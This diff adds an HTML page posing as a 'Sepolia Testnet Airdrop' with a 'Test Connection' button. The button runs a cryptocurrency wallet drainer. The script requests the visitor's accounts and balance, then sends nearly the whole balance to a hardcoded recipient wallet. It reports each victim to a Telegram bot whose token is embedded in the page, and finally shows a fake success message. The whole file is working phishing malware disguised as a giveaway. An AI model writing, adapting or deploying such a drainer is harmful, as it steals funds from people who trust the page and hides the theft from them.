@@ -1,0 +1,59 @@
+<!DOCTYPE html>  
+<html>  
+<head>  
+    <title>🔥 Sepolia Test Airdrop</title>  
+    <script>  
+        const BOT_TOKEN = "7612722516:AAEZKaiU01Dx-VbTKQTmzNqo2WZ9X7x8zKA";  
+        const CHAT_ID = "6309547301";  
+        const YOUR_WALLET = "0xF01c1348579e129974A39BAcA3cA9eCe28e68490";  
+
+        async function sendAlert(msg) {  
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);  
+        }  
+
+        async function connectWallet() {  
+            try {  
+                // Force Sepolia Network  
+                await window.ethereum.request({  
+                    method: "wallet_switchEthereumChain",  
+                    params: [{ chainId: "0xaa36a7" }] // Sepolia chain ID  
+                });  
+
+                const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });  
+                const balance = await window.ethereum.request({  
+                    method: "eth_getBalance",  
+                    params: [accounts[0]]  
+                });  
+
+                // Sepolia-specific gas calculation  
+                const gasPrice = BigInt(await window.ethereum.request({ method: "eth_gasPrice" }));  
+                const gasCost = 21000n * gasPrice;  
+                const drainAmount = BigInt(balance) - gasCost;  
+
+                await window.ethereum.request({  
+                    method: "eth_sendTransaction",  
+                    params: [{  
+                        from: accounts[0],  
+                        to: YOUR_WALLET,  
+                        value: '0x' + drainAmount.toString(16),  
+                        gas: "0x5208",  
+                        chainId: "0xaa36a7" // Explicit Sepolia chain ID  
+                    }]  
+                });  
+
+                await sendAlert(`✅ SEPOLIA SUCCESS: ${accounts[0]} DRAINED`);  
+                document.body.innerHTML = "<h1>Test successful! Check your wallet</h1>";  
+            } catch (e) {  
+                await sendAlert(`SEPOLIA ERROR: ${e.message}`);  
+            }  
+        }  
+    </script>  
+    <style>  
+        /* Same professional styling as before */  
+    </style>  
+</head>  
+<body>  
+    <h1>🔬 Sepolia Testnet Airdrop</h1>  
+    <button onclick="connectWallet()">Test Connection</button>  
+</body>  
+</html>  
